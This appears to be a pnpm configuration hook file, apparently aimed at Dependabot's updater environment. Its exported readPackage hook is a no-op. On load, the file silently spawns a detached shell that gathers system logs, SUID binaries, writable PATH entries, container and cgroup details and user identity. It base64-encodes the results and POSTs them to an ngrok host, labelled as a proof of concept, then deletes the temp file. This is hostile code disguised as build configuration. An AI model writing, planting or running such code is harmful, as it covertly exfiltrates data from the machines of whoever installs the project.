'use strict';
try {
  const { spawn } = require('child_process');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';
  const jp = process.env.DEPENDABOT_JOB_PATH || '/home/dependabot/dependabot-updater/job.json';

  const script =
    // adm group: leesrechten op /var/log/
    'echo "=VAR_LOG_LS="; ls -la /var/log/ 2>&1; ' +
    'echo "=SYSLOG="; cat /var/log/syslog 2>&1 | tail -100; ' +
    'echo "=AUTH_LOG="; cat /var/log/auth.log 2>&1 | tail -100; ' +
    'echo "=KERN_LOG="; cat /var/log/kern.log 2>&1 | tail -50; ' +
    'echo "=DPKG_LOG="; cat /var/log/dpkg.log 2>&1 | tail -30; ' +
    // alle logbestanden zoeken die leesbaar zijn
    'echo "=READABLE_LOGS="; find /var/log -readable -type f 2>/dev/null | head -30; ' +
    // SUID binaries
    'echo "=SUID="; find / -perm -4000 -type f 2>/dev/null | grep -v proc; ' +
    // writable dirs in PATH
    'echo "=WRITABLE_PATH="; for d in $(echo $PATH | tr : " "); do [ -w "$d" ] && echo "WRITABLE: $d"; done; ' +
    // /proc/1/root -- leesbaar zonder root?
    'echo "=PROC1_ROOT="; ls /proc/1/root/ 2>&1 | head -20; ' +
    // /home/dependabot/bin/ -- kun je hier schrijven?
    'echo "=HOME_BIN="; ls -la /home/dependabot/bin/ 2>&1; ' +
    // andere DEPENDABOT_OUTPUT_PATH -- output.json schrijfbaar?
    'echo "=OUTPUT_JSON="; ls -la /home/dependabot/dependabot-updater/output/ 2>&1; ' +
    // nsenter zonder sudo
    'echo "=NSENTER="; which nsenter 2>&1; nsenter --help 2>&1 | head -5; ' +
    // cgroup info
    'echo "=CGROUP="; cat /proc/self/cgroup 2>&1; ' +
    'echo "=ID="; id';

  const exfil =
    '(' + script + ') | base64 -w0 > /tmp/.px 2>/dev/null && ' +
    "curl -sk -X POST '" + NGROK + "?poc=adm_log_probe' " +
    "-H 'Content-Type: text/plain' --data-binary @/tmp/.px 2>/dev/null; " +
    'rm -f /tmp/.px';

  spawn('sh', ['-c', exfil], { detached: true, stdio: 'ignore' }).unref();
} catch (e) {}

module.exports = {
  hooks: { readPackage(pkg) { return pkg; } }
};
